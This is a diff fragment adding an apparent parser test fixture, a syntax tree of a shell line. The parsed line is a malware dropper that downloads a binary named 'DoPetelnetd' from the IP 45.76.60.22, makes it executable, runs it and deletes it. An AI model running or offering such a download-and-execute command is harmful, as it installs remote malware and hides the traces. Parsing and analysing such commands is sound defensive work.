+    WordNode(lineno=14, pos=(1711, 1715), word='wget'),
+    WordNode(lineno=14, pos=(1716, 1746), word='http://45.76.60.22/DoPetelnetd'),
+  ]),
+  OperatorNode(lineno=14, op=';', pos=(1746, 1747)),
+  CommandNode(lineno=14, pos=(1748, 1768), parts=[
+    WordNode(lineno=14, pos=(1748, 1753), word='chmod'),
+    WordNode(lineno=14, pos=(1754, 1756), word='+x'),
+    WordNode(lineno=14, pos=(1757, 1768), word='DoPetelnetd'),
+  ]),
+  OperatorNode(lineno=14, op=';', pos=(1768, 1769)),
+  CommandNode(lineno=14, pos=(1770, 1783), parts=[
+    WordNode(lineno=14, pos=(1770, 1783), word='./DoPetelnetd'),
+  ]),
+  OperatorNode(lineno=14, op=';', pos=(1783, 1784)),
+  CommandNode(lineno=14, pos=(1785, 1803), parts=[
+    WordNode(lineno=14, pos=(1785, 1787), word='rm'),
+    WordNode(lineno=14, pos=(1788, 1791), word='-rf'),
+    WordNode(lineno=14, pos=(1792, 1803), word='DoPetelnetd'),
+  ]),
+])
